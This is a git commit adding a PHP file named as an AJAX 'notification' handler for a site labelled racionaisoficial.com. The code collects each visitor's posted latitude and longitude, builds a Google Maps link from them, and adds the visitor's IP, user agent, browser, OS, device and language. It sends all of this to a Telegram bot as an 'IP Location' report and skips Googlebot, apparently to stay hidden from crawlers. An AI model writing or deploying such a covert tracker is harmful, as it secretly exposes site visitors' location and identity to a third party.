ed9362f25a2bf1ba21843bac9442e7302b36f60a
Neylton Benjamim <neylton.b@hotmail.com>
2025-03-15 12:29:53 -0300

    Adicionando ajax-notification

---
+++ ajax-notificacao.php
@@ -0,0 +1,39 @@
+<?php
+require __DIR__ . DIRECTORY_SEPARATOR . 'config.php';
+
+use Sinergi\BrowserDetector\Browser;
+use Sinergi\BrowserDetector\Os;
+use Sinergi\BrowserDetector\Device;
+use Sinergi\BrowserDetector\Language;
+
+function getData($data = [])
+{
+    $dados = json_decode($data, true);
+    $string = '';
+    foreach ($dados as $key => $valor) {
+        $string .= "{$key} => {$valor} " . PHP_EOL;
+    }
+    $string .= PHP_EOL."Link map: => https://www.google.com/maps?q={$dados['latitude']},{$dados['longitude']}".PHP_EOL;
+    return $string;
+}
+
+if (stripos($_SERVER['HTTP_USER_AGENT'], 'Googlebot')) exit;
+$browser = new Browser();
+$os = new Os();
+$device = new Device();
+$language = new Language();
+$message = "RACIONAIS - IP Location".PHP_EOL;
+$message .= "racionaisoficial.com".PHP_EOL;
+$message .= "uri: {$_POST['titulo']}".PHP_EOL;
+$message .= "uri: {$_POST['url']}".PHP_EOL;
+$message .= "racionaisoficial.com".PHP_EOL.PHP_EOL;
+$message .= PHP_EOL.PHP_EOL;
+$message .= getData($_POST['data']);
+$message .= PHP_EOL . PHP_EOL;
+$message .= 'Navegador: ' . $browser->getName() . " - " . $browser->getVersion() . PHP_EOL;
+$message .= 'Sistema operacional: ' . $os->getName() . PHP_EOL;
+$message .= 'Celular: ' . $device->getName() . PHP_EOL;
+$message .= 'Idioma: ' . $language->getLanguage() . PHP_EOL . PHP_EOL;
+$message .= "User agent: " . $_SERVER['HTTP_USER_AGENT'] . PHP_EOL . " IP: " . $_SERVER['REMOTE_ADDR'];
+$message .= PHP_EOL . PHP_EOL;
+\Telegram\BotTelegram::send($message);
